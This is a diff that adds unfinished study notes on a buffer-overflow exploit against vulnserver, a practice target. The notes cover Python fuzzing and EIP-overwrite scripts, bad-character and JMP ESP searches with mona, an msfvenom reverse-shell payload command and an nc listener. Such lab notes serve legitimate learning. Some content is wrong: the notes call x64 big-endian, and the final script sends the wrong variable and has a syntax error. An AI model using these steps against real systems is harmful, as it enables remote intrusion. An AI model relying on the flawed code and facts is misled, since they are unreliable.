@@ -1,0 +1,229 @@
+*** Editing in Progress ***
+
+Victim machine - vulnserver on Windows 10 - greycorner
+		Immunity Debugger
+
+Spiking: Finding something to break in the program
+
+Disable Windows Defender realtime protection
+Run vulnserver and Immunity Debugger as admin
+Vulnserver runs on 9999
+
+First thing we need to do is connect to vulnserver. 
+
+generic_send_tcp 
+	./generic_send_tcp $Host $Port $spike_script SKIP_VAR SKIP_STR
+
+Spike Script:
+	1. Read the line
+	2. Send a string
+	3. Send text at the end of the string
+
+In a real test you'd let it run all the way through
+
+You'll know you did something if the application becomes unresponsive
+
+The end goal is to control the EIP
+
+Fuzzing:
+
+Spiking is when you are testing all of the functionalities within a program for flaws
+Fuzzing is when you found a flaw but need to know where it happens
+
+*** Read up on try//except loops ***
+*** Read up on registers in debugging ***
+
+Example Python Fuzzing script:
+	#!/usr/bin/python
+	import sys, socket
+	from time import sleep
+
+	buffer = "A" * 100
+
+	while True:
+		try:
+			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			s.connect(('DSTIP',DSTPORT))
+			s.send(('$Command' + buffer))
+			s.close()
+			sleep(1)
+			buffer = buffer + "A"*100
+
+		except:
+			print("Fuzzing crashed at %s bytes" % str(len(buffer))
+			sys.exit()
+
+Locating the EIP value:
+	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $roundnumber_from_crashing_bytes_in_Fuzzing
+
+
+Example Python EIP location script:
+	#!/usr/bin/python
+	import sys,socket
+	
+	offset = ""
+
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('DSTIP',DSTPORT))
+		s.send(('$Command' + offset))
+		s.close()
+
+	except:
+		print("Error connecting to server")
+		sys.exit()
+
+locate the pattern offset with:
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q $EIPRegister
+
+Overwriting the EIP:
+
+The offset that you discover is where the EIP starts
+
+This is where you will prepare to insert your shellcode
+
+Example Shellcode space script:
+	#!/usr/bin/python
+	import sys, socket
+
+	shellcode = "A" * $EIPStartByte + "B" * $SizeOfEIP
+
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('DSTIP',DSTPORT))
+		s.send(('$Command' + shellcode))
+		s.close()
+
+	except:
+		print("Error connecting to server")
+		sys.exit()
+
+Finding Bad Characters:
+
+When we generate shellcode we need to know what characters are good for the shell code and what characters are bad for the shellcode
+
+x00 (NULLBYTE) is by default a bad character
+
+add the badchars variable to the script from https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
+
+If there's a bad character it will break the shellcode
+
+BadChars detection script:
+	badchars = ($badchars)
+
+	shellcode = "A" * $EIPStartByte + "B" * $SizeofEIP
+
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('DSTIP',DSTPORT))
+		s.send(('$Command' + shellcode))
+		s.close()
+
+	except:
+		print("Error connecting to server")
+		sys.exit()
+
+You know that you overwrote the EIP so what you're looking for is the Hex Dump of the ESP
+In the hexdump you're looking for missing Hex Increments for example if 11 and 13 are there we're missing 12 and that means 12 is a bad character.
+
+
+Finding the right module:
+
+Put the mona.py script into the Immunity Debugger directory.
+
+github.com/corelan/mona
+
+C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
+
+!mona modules
+
+What we're looking for is something directly attached to the server/service
+
+1. We need to find the OPCode for a JUMP
+	Need nasm_shell
+	/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+	JMP ESP - Used as a pointer to jump to the shellcode
+
+!mona find -s "\$firstbyteofthehexvalueofJMPESP\$secondbyteofthehexvalueofJMPESP" -m $directlyattachedmodule
+
+Looking for Return addresses
+
+Inject your pointer into the EIP
+
+Example Script:
+	#!/usr/bin/python
+	import sys,socket
+
+	shellcode = "A" * $EIPStartByte + "$BackwardsPointerShellcode"
+
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('DSTIP',DSTPORT))
+		s.send(('$Command' + shellcode))
+		s.close()
+	
+	except:
+		print("Error connecting to server")
+		sys.exit()
+
+If we had a Pointer of 832901af it would look like:
+	#!/usr/bin/python
+	import sys,socket
+
+	shellcode = "A" * $EIPStartByte + "\xaf\x01\x29\x83"
+
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('DSTIP',DSTPORT))
+		s.send(('$Command' + shellcode))
+		s.close()
+	
+	except:
+		print("Error connecting to server")
+
+
+x86 architecture stores in Little Endian format: Low order byte at the lowest, High order byte at the highest address
+x64 architecture stores in Big Endian format: High order byte at the lowest address, Low order byte at the highest address (?)
+
+You should find the JMP ESP in the memory dump
+
+We need to make the JMP ESP a break point in Immunity so we know that we're consistently hitting that memory address
+
+Generating Shellcode and Gaining Shells
+
+Use msfvenom to generate shellcode
+
+msfvenom -p windows/shell_reverse_tcp LHOST=SRCIP LPORT=LISTENPORT EXITFUN=thread -f c -a x86 -b "\x00"
+
+-b "\x00" is where you define your bad characters
+-a defines the architecture
+-f defines what filetype we're going to export to
+
+NOP = "\x90"
+
+Think of NOP as padding, if you have limited space obviously you're going to use less.
+
+Example Buffer Overflow Script:
+
+	#!/usr/bin/python
+	import sys,socket
+	
+	shellcode = "$GeneratedShellCode"
+	Pointer = "$character" * $EIPStartByte + "$BackwardsPointerShellCode" + $NOP * $desiredNOPcount + shellcode
+
+	try:
+		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect(('DSTIP',DSTPORT))
+		s.send(('$Command' + shellcode))
+		s.close()
+	
+	except:
+		print("Error connecting to server")
+		sys.exit()
+
+You need a listener for the port that the shellcode is going to make the remote machine connect to
+nc -lvnp $ListenerPort
+
+
